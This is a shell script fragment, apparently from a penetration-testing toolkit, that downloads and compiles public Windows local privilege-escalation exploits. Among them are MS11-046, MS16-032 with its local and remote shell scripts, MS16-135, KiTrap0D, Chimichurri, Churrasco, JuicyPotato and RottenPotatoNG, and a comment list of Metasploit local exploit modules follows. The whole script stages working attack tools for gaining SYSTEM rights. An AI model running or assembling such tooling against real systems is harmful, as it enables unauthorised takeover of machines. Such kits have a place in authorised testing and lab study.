mkdir -p public/exploits_windows_prevesc
cd public/exploits_windows_prevesc
    # export file=shell
    # i686-w64-mingw32-gcc -c -O3 -march=i686 $file.c
    # i686-w64-mingw32-gcc $file.o -o $file.exe -O3 -march=i686 -Wl,-lws2_32
    # /usr/i686-w64-mingw32/bin/strip $file.exe

    # MS11-046 -  AFD privilege escalation 
    # XP/Vista/2003/2008/7 
    if [ ! -f MS11-046_afd.exe ]; then
        banner "exploits_windows_prevesc - MS11-046_afd - https://www.exploit-db.com/exploits/40564"
        # https://github.com/abatchy17/WindowsExploits/blob/5e9c25cda54fe33fb6e1fd3ae60512a1113b41df/MS11-046/40564.c#L801
        searchsploit -m 40564
        mv 40564.c MS11-046_afd.c
        i686-w64-mingw32-gcc MS11-046_afd.c -o MS11-046_afd.exe -lws2_32
    fi

    # Secondary Logon Service 
    # Vista SP2, 2008 SP2 and R2 SP1, 7 SP1, 8.1, 2012 Gold and R2, RT 8.1, 10 Gold and 1511
    if [ ! -f MS16-032.ps1 ]; then
        banner "exploits_windows_prevesc - MS16-032.ps1 - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032"
        wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS16-032/MS16-032.ps1
    fi 
    if [ ! -f MS16-032-64_SecondaryLogo ]; then
        banner "exploits_windows_prevesc - MS16-032-64_SecondaryLogo.exe - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032"
        wget -N https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS16-032/x64/ms16-032.exe
        mv ms16-032.exe MS16-032-64_SecondaryLogo.exe
    fi
    if [ ! -f MS16-032-86_SecondaryLogo ]; then
        banner "exploits_windows_prevesc - MS16-032-86_SecondaryLogo.exe - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032"
        wget -N https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS16-032/x86/ms16-032.exe
        mv ms16-032.exe MS16-032-86_SecondaryLogo.exe
    fi
    if [ ! -f Invoke-MS16-032-Local-Shell.ps1 ]; then
        banner "exploits_windows_prevesc - Invoke-MS16-032-Local/Remote-Shell.ps1 - https://github.com/egre55/windows-kernel-exploits/tree/master/MS16-032:%20Secondary%20Logon%20Handle"
        wget -N https://github.com/egre55/windows-kernel-exploits/raw/master/MS16-032:%20Secondary%20Logon%20Handle/Invoke-MS16-032-Local-Shell.ps1
        wget -N https://github.com/egre55/windows-kernel-exploits/raw/master/MS16-032:%20Secondary%20Logon%20Handle/Invoke-MS16-032-Remote-Shell.ps1
    fi
    # TODO Compile: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034

    # NtUserSetWindowLongPtr - win32k.sys
    # https://blog.trendmicro.com/trendlabs-security-intelligence/one-bit-rule-system-analyzing-cve-2016-7255-exploit-wild/
    # 7,8,8.1,10
    if [ ! -f MS16-135_NtUserSetWindowLongPtr.ps1 ]; then
        banner "exploits_windows_prevesc - MS16-135_NtUserSetWindowLongPtr.ps1 - https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135"
        wget -N https://github.com/FuzzySecurity/PSKernel-Primitives/raw/master/Sample-Exploits/MS16-135/MS16-135.ps1
        mv MS16-135.ps1 MS16-135_NtUserSetWindowLongPtr.ps1
    fi

    # MS10-015 - User Mode to Ring Escalation (KiTrap0D)
    # NT/2000/2003/2008/XP/Vista/7
    # https://www.exploit-db.com/exploits/11199
    if [ ! -d MS10-015_KiTrap0D ]; then
        banner "exploits_windows_prevesc - MS10-015_KiTrap0D - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-015"
        wget -N https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS10-015/MS10-015.zip
        unzip MS10-015.zip
        rm screenshot.png
        rm MS10-015.zip
        mv KiTrap0D MS10-015_KiTrap0D
    fi

    # MS16-016 - mrxdav.sys WebDav Local Privilege Escalation 
    # Vista, 2008, 7, 2008 R2, 8.1, 2012, 2012 R2, RT 8.1, 10. 
    if  [ ! -d MS16-016_WebDAV ]; then
        banner "exploits_windows_prevesc - MS16-016_WebDAV - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-016"
        wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS16-016/EoP_variant.zip
        unzip EoP_variant.zip -d MS16-016_WebDAV
    fi

    # MS10-059 - Tracing Feature for Services
    # Vista, 2008, 7, 2008 R2
    if [ ! -f MS10-059_Chimichurri.exe ]; then
        banner "exploits_windows_prevesc - MS10-059_Chimichurri - https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri"
        wget https://github.com/egre55/windows-kernel-exploits/raw/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe
        mv Chimichurri.exe MS10-059_Chimichurri.exe
    fi

    # MS09-012
    # 2000, XP, 2003, Vista, 2008.
    if [ ! -f MS09-012_Churrasco.exe ]; then
        banner "exploits_windows_prevesc - MS09-012_Churrasco - https://github.com/egre55/windows-kernel-exploits/tree/master/MS09-012:%20Churrasco"
        wget https://github.com/egre55/windows-kernel-exploits/blob/master/MS09-012:%20Churrasco/Compiled/Churrasco.exe
        mv Churrasco.exe MS09-012_Churrasco.exe
    fi

    banner "exploits_windows_prevesc - juicy-potato - weaponized RottenPotatoNG - https://github.com/ohpe/juicy-potato"
    wget -N https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

    banner "exploits_windows_prevesc - RottenPotatoNG - https://github.com/breenmachine/RottenPotatoNG.git"
    # https://github.com/hatRiot/token-priv
    # https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
    git clone --depth=1 --recursive https://github.com/breenmachine/RottenPotatoNG.git

cd -

# exploit/windows/local/ms14_070_tcpip_ioctl:
#   https://forum.hackthebox.eu/discussion/456/granny-privesc-ms14-070-without-meterpreter
# exploit/windows/local/bypassuac_eventvwr:  ((User need to be in admins group))
# exploit/windows/local/ms10_092_schelevator:
# exploit/windows/local/ms13_053_schlamperei
# exploit/windows/local/ms13_081_track_popup_menu:
# exploit/windows/local/ms14_058_track_popup_menu:
# exploit/windows/local/ms15_051_client_copy_image: 
# exploit/windows/local/ms16_032_secondary_logon_handle_privesc: 
# exploit/windows/local/ms16_075_reflection: .
# exploit/windows/local/ms16_075_reflection_juicy
# exploit/windows/local/ppr_flatten_rec: 
# MS16-098+
# exploit/windows/local/ms15_004_tswbproxy:


# Hot Potato
# https://github.com/foxglovesec/Potato
# https://github.com/Kevin-Robertson/Tater